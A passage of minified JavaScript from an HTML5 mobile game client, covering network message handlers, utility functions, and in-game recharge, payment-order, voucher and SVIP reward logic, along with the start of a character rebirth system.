t=this.getBytes(55);t.writeByte(urlParam.lifeResetRewardId),this.sendToServer(t)}},e.prototype.postOffLine=function(t){var e=t.readInt(),i=t.readInt(),n=t.readInt(),o=t.readInt();e&&win.open("OfflineRewardWin",e,i,n,o)},e.prototype.sendOffLine=function(t){var e=this.getBytes(48);e.writeByte(t),this.sendToServer(e)},e.prototype.doPaoPaoExp=function(t){var e=t.readInt()||0;},e.prototype.sendAdReward=function(t){var e=this.getBytes(50);e.writeShort(t),console.log("【sendAdReward】type=:"+t),this.sendToServer(e)},e.prototype.postAdReward=function(t){var e=t.readByte();return console.log("【postAdReward】res=:"+e),1==e},e.prototype.sendAdFhCount=function(){var t=this.getBytes(51);this.sendToServer(t)},e.prototype.doAdFhCount=function(t){var e=t.readByte();return e},e.prototype.doKfCost=function(t){this.kfCost=t.readInt()},e.prototype.moveResult=function(t){var e=t.readByte(),i=t.readInt(),n=t.readInt();return[1==e,i,n]},e.HOOK_STATE_HOOK=0,e.HOOK_STATE_FIND_ENMENY=1,__decorate([post()],e.prototype,"postRemoveMapArrow",null),__decorate([post()],e.prototype,"closeChangeSceneBar",null),__decorate([post()],e.prototype,"postSubRoleChange",null),__decorate([post()],e.prototype,"postEnterMap",null),__decorate([post()],e.prototype,"postCreateOtherEntity",null),__decorate([post()],e.prototype,"updateMy",null),__decorate([post()],e.prototype,"postRuneShatter",null),__decorate([post()],e.prototype,"postRuneExchange",null),__decorate([post()],e.prototype,"postLevelBarChange",null),__decorate([post()],e.prototype,"postAdjustMapPos",null),__decorate([post()],e.prototype,"postDie",null),__decorate([post()],e.prototype,"postNeiGongChange",null),__decorate([post()],e.prototype,"postEntityHpChange",null),__decorate([post()],e.prototype,"postRemoveEntity",null),__decorate([post()],e.prototype,"postMeMove",null),__decorate([post()],e.prototype,"postShowCenter",null),__decorate([post(!0)],e.prototype,"moveCamera",null),__decorate([post()],e.prototype,"postMpChange",null),__decorate([post()],e.prototype,"postExpMc",null),__decorate([post()],e.prototype,"syncMyPos",null),__decorate([post()],e.prototype,"postGuildChange",null),__decorate([post()],e.prototype,"postOtherAttChange",null),__decorate([post()],e.prototype,"postRename",null),__decorate([post()],e.prototype,"postChangeAttrPoint",null),__decorate([post()],e.prototype,"postChangeTarget",null),__decorate([post()],e.prototype,"postAtkTarget",null),__decorate([post()],e.prototype,"postAllAtkTarget",null),__decorate([post()],e.prototype,"createEntityByModel",null),__decorate([post()],e.prototype,"createEntity2",null),__decorate([post()],e.prototype,"postHookStateChange",null),__decorate([post()],e.prototype,"postMoveEntity",null),__decorate([post()],e.prototype,"postViewOpen",null),__decorate([post()],e.prototype,"postChangeCamp",null),__decorate([post()],e.prototype,"postFunsShow",null),__decorate([post()],e.prototype,"postFlyItem",null),__decorate([post()],e.prototype,"postFlyItemEx",null),__decorate([post()],e.prototype,"postInputText",null),__decorate([post()],e.prototype,"postAdReward",null),__decorate([post()],e.prototype,"doAdFhCount",null),__decorate([post()],e.prototype,"doKfCost",null),__decorate([post()],e.prototype,"moveResult",null),e}(c.BaseSystem);e.GameLogic=ee,window.GameLogic=ee,__reflect(ee.prototype,"GameLogic",[]),Systemap.GameLogic=function(){return ee.ins()},window.GameLogic=ee},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.SortType=e.CommonUtils=void 0;var n=i(50),o=i(0),s=i(55),a=i(103),r=i(42),l=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.getKeyboard=function(t,e){if("7000183"==urlParam.appid&&window.mz){var i=void 0;switch(t){case 0:i=30;break;case 1:i=100;break;case 2:i=o.GlobalConfig.FriendLimit.contentLimit}}},e.addLableStrokeColor=function(t,e,i){t.strokeColor=e,t.stroke=i},e.getObjectLength=function(t){var e=0;for(var i in t)e++;return e},e.getObjectByAttr=function(t,e,i){for(var n in t)if(t[n][e]==i)return t[n];return null},e.getObjectByUnionAttr=function(t,e,i){for(var n in t)if(n==e.toString())for(var o in t[n])if(o==i.toString())return t[n][o];return null},e.copyDataHandler=function(t){var e;if(t instanceof Array)e=[];else{if(!(t instanceof Object))return t;e={}}for(var i=Object.keys(t),n=0,o=i.length;o>n;n++){var s=i[n];e[s]=this.copyDataHandler(t[s])}return e},e.objectToArray=function(t){if(t instanceof Object){t=this.copyDataHandler(t);for(var e=[],i=Object.keys(t),n=0,o=i.length;o>n;n++){var s=i[n];t[s]&&e.push(t[s])}return e}return t},e.objectToArrayShallow=function(t){if(t instanceof Object){var e=[];for(var i in t)null!=t[i]&&e.push(t[i]);return e}return t},e.arraySort=function(t,e,i){return void 0===i&&(i=h.Asc),t.sort(function(t,n){return e?i==h.Asc?s.Algorithm.sortAsc(t[e],n[e]):s.Algorithm.sortDesc(t[e],n[e]):i==h.Asc?s.Algorithm.sortAsc(t,n):s.Algorithm.sortDesc(t,n)}),t},e.lock=function(){a.StageUtils.ins().getStage().touchEnabled=a.StageUtils.ins().getStage().touchChildren=!1},e.unlock=function(){a.StageUtils.ins().getStage().touchEnabled=a.StageUtils.ins().getStage().touchChildren=!0},e.labelIsOverLenght=function(t,e){t.text=this.overLength(e)},e.getDimond=function(){var t=this,e=new eui.Group;e.left=0,e.top=35;var i=new eui.Image;i.source="ziyuan_bg_png",e.addChild(i);var n=new eui.Image;n.left=0,n.source="ziyuan_zuanshi_png",e.addChild(n);var o=new eui.Label;return o.right=25,o.verticalCenter=1,window.h5gamecn&&window.h5gamecn.getBalance&&window.h5gamecn.getBalance(function(e){o.text=t.overLengthTwo(+e.balance)}),e.addChild(o),e},e.overLengthTwo=function(t){var i=null;return 1e4>t?i=Math.floor(t)+"":t>1e8?(t/=1e8,t=Math.floor(100*t)/100,i=t+e.unitsStr[1]):(t/=1e4,t=Math.floor(100*t)/100,i=t+e.unitsStr[0]),i},e.overLength=function(t,i){void 0===i&&(i=5);var n=null,o=getLangType();if(o==LanguageEnum.CN||o==LanguageEnum.CN1)1e5>t?n=Math.floor(t)+"":t>1e8?(t/=1e8,t=Math.floor(10*t)/10,n=t+e.unitsStr[1]):(t/=1e4,t=Math.floor(10*t)/10,n=t+e.unitsStr[0]);else{var s=0;if(t>=1e9){s=3;var a=t/1e9,l=a.toString().split("."),h=l[0].length,u=i-h;n=u>0?a.toFixed(u):Math.floor(a)+""}else if(t>=1e6){s=1;var a=t/1e6,l=a.toString().split("."),h=l[0].length,u=i-h;n=u>0?a.toFixed(u):Math.floor(a)+""}else if(t>=1e4){s=2;var a=t/1e3,l=a.toString().split("."),h=l[0].length,u=i-h;n=u>0?a.toFixed(u):Math.floor(a)+""}else n=t+"";n=r.StringUtils.subZeroAndDot(n),1==s?n+="M":2==s?n+="K":3==s&&(n+="B")}return n},e.overLengthChange=function(t){var i=null;return 1e4>t?i=Math.floor(t)+"":t>1e8?(t/=1e8,t=Math.floor(10*t)/10,i=t+e.unitsStr[1]):(t/=1e4,t=Math.floor(10*t)/10,i=t+e.unitsStr[0]),i},e.overLengthNo=function(t){var i=null;return 1e4>t?i=Math.floor(t)+"":t>1e8?(t/=1e8,t=Math.floor(10*t)/10>>0,i=t+e.unitsStr[1]):(t/=1e4,t=Math.floor(10*t)/10>>0,i=t+e.unitsStr[0]),i},e.copyResult=function(t){var e=document.createElement("input");e.value=t,document.body.appendChild(e),e.select(),e.setSelectionRange(0,e.value.length),document.execCommand("Copy"),document.body.removeChild(e)},e}(n.BaseClass);e.CommonUtils=l,window.CommonUtils=l,__reflect(l.prototype,"CommonUtils",[]),window.CommonUtils=l;var h;!function(t){t[t.Asc=0]="Asc",t[t.Desc=1]="Desc"}(h=e.SortType||(e.SortType={})),window.SortType=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RechargeData=e.ShowRechargeType=e.Recharge=void 0;var n=i(24),o=i(14),s=i(0),a=i(4),r=i(85),l=i(2),h=i(19),u=i(17),p=i(45),d=i(27),c=i(7),f=i(170),g=i(56),m=i(6),v=function(t){function e(){var e=t.call(this)||this;return e._rechargeData=[],e.flag=0,e.forevetCard=0,e.rechargeTotal={totalDay:0,hasGetDays:[]},e.rechargeTotal2={totalDay:0,hasGetDays:[]},e._isOpenIosRecharge=!1,e.isSvipActed=!1,e.todayRechargeAmount=0,e.totalRechargeAmount=0,e.YuanBaoLimitValue=0,e.rpRecycle=new u.RedPoint,e.rpGodOfWar=new u.RedPoint,e.rpRecharge1=new u.RedPoint,e.rpAct0_2=new u.RedPoint,e.rpAct0_2_1=new u.RedPoint,e.rpSvip=new u.RedPoint,e.recharge_type=0,e._ridOrderCd={},e.franchiseflag=0,e.franchiseget=0,e.firstBuy=0,e.godOfWarTime=0,e.godOfWarIsGet=0,e.recycleTime=0,e.recycleIsGet=0,e.fristRechargeInfoDic={},e.recharge1WinInfoDic={},e.recharge1WinNum=0,e.sysId=PackageID.Recharge,e.regNetMsg(1,e.postRecharge1Data),e.regNetMsg(2,e.changeRecharge1Data),e.regNetMsg(4,e.doPayOrder),e.regNetMsg(6,e.getRecharge2Data),e.regNetMsg(7,e.changeRecharge2Data),e.regNetMsg(8,e.postUpDataItem),e.regNetMsg(9,e.postRechargeTotalDay),e.regNetMsg(20,e.postGetMonthDay),e.regNetMsg(22,e.postGetWeekDay),e.regNetMsg(11,e.postFranchiseInfo),e.regNetMsg(12,e.postMuchDayRecReward),e.regNetMsg(23,e.postRechargeTotalDay2),e.regNetMsg(27,e.onRecycle),e.regNetMsg(28,e.onGodOfWar),e.regNetMsg(29,e.getRecharge1WinInfo),e.regNetMsg(30,e.onAdPrivilege),e.regNetMsg(31,e.onAutoPrivilege),e.regNetMsg(32,e.onNewSvipInfo),e.regNetMsg(33,e.getRechargeValue),e.regNetMsg(36,e.postFirstChargeNew),observe(e,e.updateIosRecharge,a.ActorCC.init),observe(e,e.updateIosRecharge,a.ActorCC.postLevelChange),e.initRed(),e}return __extends(e,t),e.prototype.initRed=function(){var t=this;this.rpGodOfWar=new u.RedPoint(function(){var e=t.godOfWarTime>0&&!t.godOfWarIsGet&&!window.platform.isshen();return e},this.postGodWar),this.rpRecycle=new u.RedPoint(function(){var e=t.recycleTime>0&&!t.recycleIsGet&&!window.platform.isshen();return e},this.postRecycle),this.rpRecharge1=new u.RedPoint(function(){return t.isRecharge1Rp()},this.getRecharge1WinInfo),this.rpRecharge1.v=this.isRecharge1Rp(),this.rpAct0_2=new u.RedPoint(function(){return t.check0_2Rp()},this.postRechargeTotalDay),this.rpAct0_2.v=this.check0_2Rp(),this.rpAct0_2_1=new u.RedPoint(function(){return t.check0_2_1Rp()},this.postRechargeTotalDay2),this.rpAct0_2_1.v=this.check0_2_1Rp(),this.rpSvip=new u.RedPoint(function(){return t.isCanActive()},this.onNewSvipInfo)},e.ins=function(){return t.ins.call(this)},Object.defineProperty(e.prototype,"isOpenIosRecharge",{get:function(){return!urlParam.isWXiOS||3!=+urlParam.apptype||this._isOpenIosRecharge||urlParam.debugTS?!0:!1},set:function(t){this._isOpenIosRecharge=t},enumerable:!1,configurable:!0}),e.prototype.getRechargeData=function(t){return void 0===t&&(t=-1),-1==t?this._rechargeData:this._rechargeData[t]||new C},e.prototype.getCurRechargeConfig=function(){var t=this.getRechargeData(0),e=n.CommonUtils.getObjectLength(s.GlobalConfig.DailyRechargeConfig);if(t.day<=e)return s.GlobalConfig.DailyRechargeConfig[t.day];var i=t.day-e;return e=n.CommonUtils.getObjectLength(s.GlobalConfig.LoopRechargeConfig),i=i%e||e,s.GlobalConfig.LoopRechargeConfig[i]
},e.prototype.getCurDailyRechargeIsAllGet=function(){for(var t=e.ins().getRechargeData(0),i=e.ins().getCurRechargeConfig(),o=n.CommonUtils.getObjectLength(i),s=0;o>s;s++){var a=t.isAwards>>s&1;if(!a)return!1}return!0},e.prototype.sendGetAwards=function(t,e){var i=this.getBytes(0==t?2:7);i.writeShort(e),this.sendToServer(i)},e.prototype.postRecharge1Data=function(t){this.recharge(t,0)},e.prototype.changeRecharge1Data=function(t){var e=this.getBytes(2);e.writeByte(t),this.sendToServer(e)},e.prototype.postUpdateRechargeEx=function(t){return{type:t}},e.prototype.postUpdateRecharge=function(t){return t},e.prototype.getDayReward=function(t){var e=this.getBytes(3);e.writeShort(t),this.sendToServer(e)},e.prototype.getRecharge2Data=function(t){},e.prototype.changeRecharge2Data=function(t){var i=this.getRechargeData(1);i&&(i.change(t),e.ins().postUpdateRecharge(1))},e.prototype.getRechargeTotalAward=function(t){var e=this.getBytes(8);e.writeShort(t),this.sendToServer(e)},e.prototype.recharge=function(t,i){if(this._rechargeData[i]||(this._rechargeData[i]=new C),this._rechargeData[i].parser(t,i),0==i){var n=e.ins().getCurDailyRechargeIsAllGet();n&&win.close("Recharge2Win")}e.ins().postUpdateRechargeEx(i),this.recharge_type=i},e.prototype.postUpDataItem=function(t){this.costList=t.readInt()},e.prototype.postRechargeTotalDay=function(t){this.rechargeTotal={},this.rechargeTotal.hasGetDays=[];for(var e=t.readShort(),i=0;e>i;i++)this.rechargeTotal.hasGetDays.push(t.readShort());this.rechargeTotal.totalDay=t.readShort()},e.prototype.postGetMonthDay=function(t){var e=t.readUnsignedInt();e>0?this.monthDay=e:this.monthDay=0,e>0&&(this.flag=2),this.forevetCard=t.readInt(),!r.Setting.ins().getValue(r.ClientSet.firstMonthCard)&&(this.monthDay>0||this.getIsForeve())&&r.Setting.ins().setValue(r.ClientSet.firstMonthCard,1)},e.prototype.getOrderByIndex=function(t){return void 0===t&&(t=0),this.costList>>t&1},Object.defineProperty(e.prototype,"monthDay",{get:function(){return this._monthDay},set:function(t){this._monthDay!=t&&(this._monthDay=t,Timer.stop(this.downTime,this),this._monthDay>0&&Timer.start(1e3,this._monthDay,this.downTime,this))},enumerable:!1,configurable:!0}),e.prototype.downTime=function(){this._monthDay-=1},e.prototype.postGetWeekDay=function(t){var e=t.readUnsignedInt();e>0?this._weekDay=1e3*e+egret.getTimer():this._weekDay=0},Object.defineProperty(e.prototype,"weekDay",{get:function(){return this._weekDay-egret.getTimer()},enumerable:!1,configurable:!0}),e.prototype.doPayOrder=function(t){var e=t.readInt(),i=t.readString(),n=t.readInt(),o=t.readInt(),s=(t.readShort(),t.readString()),a=t.readString();if(console.log("sendPayOrder,success,code=",e," order=",i," rid=",o),!i)return void console.log(gettext("充值已关闭"));if(-1==o)return console.warn(gettext("请求游戏服务器充值订单号返回yb错误"),o),void l.TipsCT.ins().showTips(gettext("无法充值"));200!=e&&console.warn(gettext("请求游戏服务器充值订单号失败"),e,i,o);var r=this.getCfgByRid(o);r?(console.log("doPayOrder====>platform.pay,nowTime=",egret.getTimer()),platform.pay(r.ybCount,n,i,r,s,a)):console.warn(gettext("请求游戏服务器充值订单号返回rid错误"),o)},e.prototype.sendPayOrder=function(t,e){var i=this,n=this.getCashByRid(t);if(-1==n)return void console.log("充值配置RechargeConfig不存在rid=",t);var o=this.getCfgByRid(t);if(o&&o.voucher){var s=h.GlobalFun.getItemName(o.voucher.id),a=m.BagCT.ins().getBagGoodsCountById(0,o.voucher.id);return void(h.GlobalFun.checkCost(o.voucher.count,o.voucher.id,"",!1)?d.WarnWin.show(gettext("是否消耗{0}{1}充值?\n\n剩余代金券: {2}",o.voucher.count,s,a),function(){i.sendUseVoucher(t)},this):d.WarnWin.show(gettext("代金券数量不足，是否前往购买代金券?\n\n剩余代金券: {0}",a),function(){win.open(f.QingDianMainWin2,0,g.Activity1003PageStyle.Activity1003)},this,function(){},this))}this.sendPayOrder2(t,e)},e.prototype.sendPayOrder2=function(t,e){var i=this.getCashByRid(t);if(-1==i)return void console.log("充值配置RechargeConfig不存在rid=",t);if(this._ridOrderCd[t]>0&&c.GameServerCC.serverTime<this._ridOrderCd[t]&&!urlParam.isLocation)return void l.TipsCT.ins().showTips(gettext("存在订单处理中，请稍后"));this._ridOrderCd[t]=c.GameServerCC.serverTime+1e3*(s.GlobalConfig.ClientGlobalConfig.rechargeCD||2);var n="";e&&Array.isArray(e)&&(n=e.join(","));var o=this.getBytes(4);o.writeInt(i),o.writeInt(t),o.writeShort(0),o.writeString(""),o.writeString(n),o.writeString((null===urlParam||void 0===urlParam?void 0:urlParam.appid)||"");var r=s.GlobalConfig.RechargeUpperConfig;if(r){var h=Math.floor(a.ActorCC.level/10)+1;if(this.YuanBaoLimitValue){var u=r[h].yuanbaoUpper;if(u<this.YuanBaoLimitValue){var f=r[h].level;return void d.WarnWin.show(gettext("需人物超过{0}级,才能继续充值！",f),function(){},this)}}}return a.ActorCC.isLocation?(p.gm("@newfee "+t),void console.log("gm直接充值档位=",t)):(console.log("sendPayOrder=",t," nowTime=",egret.getTimer()),void this.sendToServer(o))},e.prototype.getCashByYb=function(t){var e=this.getRechargeCfgByYB(t);return e?this.getCashByRid(e.rid):t/s.GlobalConfig.ClientGlobalConfig.rate*100},e.prototype.getCashByRid=function(t){var e=s.GlobalConfig.RechargeConfig[t];return e?e.cash:-1},e.prototype.getCfgByRid=function(t){var e=s.GlobalConfig.RechargeConfig[t];return e?e:null},e.prototype.getRechargeCfgByYB=function(t){var e=urlParam&&urlParam.apptype&&!urlParam.apptype?urlParam.apptype:"m2df";if(e){var i=s.GlobalConfig.RechargeItemsConfig;for(var n in i){var o=i[n],a=o.appType;if(t==o.amount&&(-1!=a.indexOf(e)||void 0==a))return o}}return null},e.getChannelMulti=function(){return s.GlobalConfig.ChongZhiBaseConfig.channelMultiRecharge[+urlParam.appid]||1},e.prototype.updateIosRecharge=function(){if(window.isOpenIosRecharge){var t={vip:a.ActorCC.vip,level:a.ActorCC.level,openRecharge:!1};window.isOpenIosRecharge(t,function(t){e.ins().isOpenIosRecharge=t,console.log("是否打开ios充值",e.ins().isOpenIosRecharge)})}},e.prototype.getIsForeve=function(){return 2==e.ins().forevetCard},e.prototype.sendGetFranchise=function(){this.sendBaseProto(10)},e.prototype.postFranchiseInfo=function(t){var e=t.readUnsignedInt();e>0?this.franchise=e:this.franchise=0,this.franchiseget=t.readByte(),this.firstBuy=t.readUnsignedByte()},Object.defineProperty(e.prototype,"franchise",{get:function(){return this._franchise},set:function(t){this._franchise!=t&&(this._franchise=t,Timer.stop(this.franchiseTime,this),this._franchise>0&&Timer.start(1e3,this._franchise,this.franchiseTime,this))},enumerable:!1,configurable:!0}),e.prototype.franchiseTime=function(){this._franchise-=1,this._franchise<=0},e.prototype.getRechargeList=function(){var t=s.GlobalConfig.RechargeDaysAwardsConfig,i=[],o={},a={};for(var r in t)o[t[r].sum]||(o[t[r].sum]=[]),a[t[r].sum]||(a[t[r].sum]=0),e.ins().rechargeTotal.hasGetDays.indexOf(t[r].id)>=0&&a[t[r].sum]++,o[t[r].sum].push(t[r]);for(var r in a){if(i.length)break;if(!(a[r]>=n.CommonUtils.getObjectLength(o[r])))for(var l in o[r])i.push(o[r][l])}return i},e.prototype.sendMuchDayRecReward=function(){this.sendBaseProto(11)},e.prototype.postMuchDayRecReward=function(t){this.mRecNum=t.readInt(),this.mReward=t.readByte(),this.mDayNum=t.readShort()},e.prototype.getRechargeList2=function(){var t=s.GlobalConfig.LuxuryRechargeDaysAward,i=[],o={},a={};for(var r in t)o[t[r].sum]||(o[t[r].sum]=[]),a[t[r].sum]||(a[t[r].sum]=0),e.ins().rechargeTotal2.hasGetDays.indexOf(t[r].id)>=0&&a[t[r].sum]++,o[t[r].sum].push(t[r]);for(var r in a){if(i.length)break;if(!(a[r]>=n.CommonUtils.getObjectLength(o[r])))for(var l in o[r])i.push(o[r][l])}return i},e.prototype.postRechargeTotalDay2=function(t){this.rechargeTotal2={},this.rechargeTotal2.hasGetDays=[];for(var e=t.readShort(),i=0;e>i;i++)this.rechargeTotal2.hasGetDays.push(t.readShort());this.rechargeTotal2.totalDay=t.readShort()},e.prototype.getRechargeTotalAward2=function(t){var e=this.getBytes(24);e.writeShort(t),this.sendToServer(e)},e.prototype.onGodOfWar=function(t){this.godOfWarTime=t.readUnsignedInt(),this.godOfWarIsGet=t.readByte(),this.postGodWar()},e.prototype.sendGodOfWar=function(){var t=this.getBytes(28);this.sendToServer(t)},e.prototype.postGodWar=function(){},e.prototype.onRecycle=function(t){this.recycleTime=t.readUnsignedInt(),this.recycleIsGet=t.readByte(),this.postRecycle()},e.prototype.sendRecycle=function(){var t=this.getBytes(27);this.sendToServer(t)},e.prototype.postRecycle=function(){},e.prototype.getRechargeValue=function(t){this.YuanBaoLimitValue=t.readUnsignedInt()},e.prototype.sendGetFirstChargeNew=function(t,e){var i=this.getBytes(36);i.writeInt(t),i.writeByte(e),this.sendToServer(i)},e.prototype.postFirstChargeNew=function(t){this.fristRechargeInfoDic={};for(var e=t.readByte(),i=0;e>i;i++){var n=t.readInt(),o=t.readByte();this.fristRechargeInfoDic[n]=this.fristRechargeInfoDic[n]||[];for(var s=0;o>s;s++){var a=t.readByte(),r=t.readByte();this.fristRechargeInfoDic[n][a]={day:a,type:r}}}},e.prototype.Recharge1WinisOpen=function(){for(var t in this.recharge1WinInfoDic)for(var e=this.recharge1WinInfoDic[t]||[],i=1;i<e.length;i++)if(2!=e[i].type)return!0;return!1},e.prototype.getRecharge1WinInfo=function(t){this.recharge1WinInfoDic={},this.recharge1WinNum=t.readInt();for(var e=t.readByte(),i=0;e>i;i++){var n=t.readInt();this.recharge1WinInfoDic[n]&&delete this.recharge1WinInfoDic[n],this.recharge1WinInfoDic[n]={};var o=[];o.push([]);for(var s=t.readByte(),a=0;s>a;a++){var r=t.readByte(),l=t.readByte();o.push({day:r,type:l})}this.recharge1WinInfoDic[n]=o}},e.prototype.isRecharge1Rp=function(){if(window.platform.isshen())return!1;for(var t in this.recharge1WinInfoDic)if(this.checkKeyRp(t))return!0;return!1},e.prototype.checkKeyRp=function(t){for(var e=this.recharge1WinInfoDic[t],i=1;i<e.length;i++)if(1==e[i].type)return!0;return!1},e.prototype.isGetAllReward=function(){if(window.platform.isshen())return!1;for(var t in this.recharge1WinInfoDic)for(var e=this.recharge1WinInfoDic[t],i=1;i<e.length;i++)if(2!=e[i].type)return!1;return!0},e.prototype.onAdPrivilege=function(t){this.isGotAdPrivilege=t.readByte(),this.postAdPrivilege()},e.prototype.postAdPrivilege=function(){},e.prototype.onAutoPrivilege=function(t){this.AutoPrivilegeTime=-2,this.postAutoPrivilege()},e.prototype.postAutoPrivilege=function(){},e.prototype.onNewSvipInfo=function(t){var e=t.readByte();this.isSvipActed=1==e,this.todayRechargeAmount=t.readInt(),this.totalRechargeAmount=t.readDouble()},e.prototype.sendNewRecycle=function(t,e){var i=this.getBytes(29);i.writeInt(t),i.writeByte(e),this.sendToServer(i)},e.prototype.sendActiveNewSvip=function(){var t=this.getBytes(32);this.sendToServer(t)},e.prototype.sendUseVoucher=function(t){var e=this.getBytes(34);e.writeInt(t),this.sendToServer(e)},e.prototype.check0_2Rp=function(){if(window.platform.isshen())return!1;var t=[],e=this.getRechargeList();for(var i in e)t.push(e[i]);for(var n=0;n<t.length;n++)if(!(this.rechargeTotal.hasGetDays.indexOf(t[n].id)>=0)&&t[n].id<=this.rechargeTotal.totalDay)return!0;return!1},e.prototype.check0_2_1Rp=function(){if(window.platform.isshen())return!1;var t=[],e=this.getRechargeList2();for(var i in e)t.push(e[i]);for(var n=0;n<t.length;n++)if(!(this.rechargeTotal2.hasGetDays.indexOf(t[n].id)>=0)&&t[n].id<=this.rechargeTotal2.totalDay)return!0;return!1},e.prototype.isCanActive=function(){return e.ins().isSvipActed?!1:this.getSvipTodayRechargeAmount()&&e.ins().todayRechargeAmount>=this.getSvipTodayRechargeAmount()?!0:this.getSvipTotalRechargeAmount()&&e.ins().totalRechargeAmount>=this.getSvipTotalRechargeAmount()?!0:!1},e.prototype.getSvipTodayRechargeAmount=function(){var t=urlParam?urlParam.apptype:"";if(t&&s.GlobalConfig.ChongZhiBaseConfig.newsvipSpecial[t]){var e=s.GlobalConfig.ChongZhiBaseConfig.newsvipSpecial[t].newsvipDay;return e||0}return s.GlobalConfig.ChongZhiBaseConfig.newsvipDay},e.prototype.getSvipTotalRechargeAmount=function(){var t=urlParam?urlParam.apptype:"";if(t&&s.GlobalConfig.ChongZhiBaseConfig.newsvipSpecial[t]){var e=s.GlobalConfig.ChongZhiBaseConfig.newsvipSpecial[t].newsvipTotal;return e||0}return s.GlobalConfig.ChongZhiBaseConfig.newsvipTotal},e.YB_TO_PAY=100,__decorate([post()],e.prototype,"postRecharge1Data",null),__decorate([post()],e.prototype,"postUpdateRechargeEx",null),__decorate([post()],e.prototype,"postUpdateRecharge",null),__decorate([post()],e.prototype,"postUpDataItem",null),__decorate([post()],e.prototype,"postRechargeTotalDay",null),__decorate([post()],e.prototype,"postGetMonthDay",null),__decorate([post()],e.prototype,"postGetWeekDay",null),__decorate([post()],e.prototype,"postFranchiseInfo",null),__decorate([post()],e.prototype,"postMuchDayRecReward",null),__decorate([post()],e.prototype,"postRechargeTotalDay2",null),__decorate([post()],e.prototype,"postGodWar",null),__decorate([post()],e.prototype,"postRecycle",null),__decorate([post()],e.prototype,"postFirstChargeNew",null),__decorate([post()],e.prototype,"getRecharge1WinInfo",null),__decorate([post()],e.prototype,"postAdPrivilege",null),__decorate([post()],e.prototype,"postAutoPrivilege",null),__decorate([post()],e.prototype,"onNewSvipInfo",null),e}(o.BaseSystem);e.Recharge=v,window.Recharge=v,__reflect(v.prototype,"Recharge",[]);var y;!function(t){t[t.Type_Normal=0]="Type_Normal",t[t.Type_WeekCard=1]="Type_WeekCard",t[t.Type_MonthCard=2]="Type_MonthCard",t[t.Type_SpecialCard=3]="Type_SpecialCard",t[t.Type_Cardgift=4]="Type_Cardgift",t[t.Type_TOUZI41=5]="Type_TOUZI41",t[t.Type_JackPot=6]="Type_JackPot",t[t.Type_Rexue=7]="Type_Rexue",t[t.Type_WarOrder=8]="Type_WarOrder",t[t.Type_Treasure=9]="Type_Treasure",t[t.Type_DailyGift=10]="Type_DailyGift",t[t.Type_Vipgift=11]="Type_Vipgift",t[t.Type_OneYuanGift=12]="Type_OneYuanGift",t[t.Type_Pactivity55=13]="Type_Pactivity55",t[t.Type_FirstRecharge=14]="Type_FirstRecharge"}(y=e.ShowRechargeType||(e.ShowRechargeType={})),window.ShowRechargeType=y,window.ShowRechargeType=y;var C=function(){function t(){}return t.prototype.parser=function(t,e){this.day=t.readShort()+1,this._firstPayday=t.readShort()+1,this.curDayPay=t.readInt(),this._num=t.readInt(),this.isAwards=t.readInt()},t.prototype.change=function(t){this._num=t.readInt(),this.isAwards=t.readInt()},t.prototype.firstPayDay=function(){return this.day-this._firstPayday},Object.defineProperty(t.prototype,"num",{get:function(){if(this._firstPayday>0){for(var t=n.CommonUtils.getObjectLength(s.GlobalConfig.FirstRechargeClientConfig),e=1;t>=e;e++)if(0==(this._num>>e&1))return 1;return 2}return 0},enumerable:!1,configurable:!0}),t.prototype.firstRewardStateByDay=function(t){return this._firstPayday>0?(t++,0==(this._num>>t&1)?1:2):0},t.checkOpenWin=function(){h.GlobalFun.openRechargeWin()},t}();e.RechargeData=C,window.RechargeData=C,__reflect(C.prototype,"RechargeData",[]),Systemap.Recharge=function(){return v.ins()},window.Recharge=v},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ZsCT=void 0;var n=i(14),o=i(17),s=i(0),a=i(4),r=i(13),l=i(6),h=i(2),u=i(121),p=function(t){function e(){var e=t.call(this)||this;return e.attr=[],e.rp=new o.RedPoint,e.isSendXW=[],e.sysId=PackageID.Zs,e.regNetMsg(1,e.postZsData),observe(e,e.initRps,r.SubRoles.ins().doSubRole),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.initRps=function(){var t=this,e=new o.RedPoint(function(){return t.checkRed()},this.postZsData),i=new o.RedPoint(function(){return t.checkXWRp1()},this.postZsData),n=new o.RedPoint(function(){return t.checkXWRp2()},this.postZsData,l.BagCT.ins().postItemChange,l.BagCT.ins().doAddItem);this.rp.addSub(i),this.rp.addSub(n),this.rp.addSub(e)},e.prototype.checkRed=function(){return this.checkOpen()?this.getAddPoint()>0?!0:this.isCanUp():!1},e.prototype.checkXWRp=function(){return this.checkXWRp1()||this.checkXWRp2()},e.prototype.checkXWRp1=function(){var t;return this.checkOpen()?this.isMaxLevel()?!1:this.upgradeCount[0]<s.GlobalConfig.ZhuanShengConfig.conversionCount&&a.ActorCC.exp>(null===(t=s.GlobalConfig.ZhuanShengStageConfig[this.lv])||void 0===t?void 0:t.costExp)?!0:!1:!1},e.prototype.checkXWRp2=function(){if(!this.checkOpen())return!1;if(this.isMaxLevel())return!1;var t=s.GlobalConfig.ZhuanShengConfig,e=t.normalItem;return this.upgradeCount[1]<s.GlobalConfig.ZhuanShengConfig.normalCount&&l.BagCT.ins().getBagGoodsCountById(l.BagCT.BAG_TYPE_OTHTER,e)>0?!0:!1},e.prototype.isCanUp=function(){var t=e.ins().lv;if(this.isMaxLevel())return!1;var i=s.GlobalConfig.ZhuanShengStageConfig[t];return a.ActorCC.level<i.needLevel?!1:i.lhLevel&&u.LhCT.ins().lv<i.lhLevel?!1:e.ins().exp>=i.needExp?!0:!1},e.prototype.isMaxLevel=function(){var t=s.GlobalConfig.ZhuanShengStageConfig[e.ins().lv+1]?!1:!0;return t},e.prototype.postZsData=function(t){this.stage=t.readInt(),this.lv=t.readShort();var e=this.exp;this.exp=t.readInt(),this.upgradeCount=[t.readShort(),t.readShort(),t.readShort()];var i=5;this.attr=[];for(var n=0;i>n;n++)this.attr.push({id:t.readShort(),count:t.readInt()});this.attr.sort(function(t,e){return t.id>e.id?1:-1}),e&&this.exp-e>0&&a.ActorCC.postZsExpChange(this.exp-e),this.postZsLv()},e.prototype.postZsLv=function(){},e.prototype.sendGetXiuWei=function(t,e){if(void 0===e&&(e=0),!this.canUpgrade2())return void 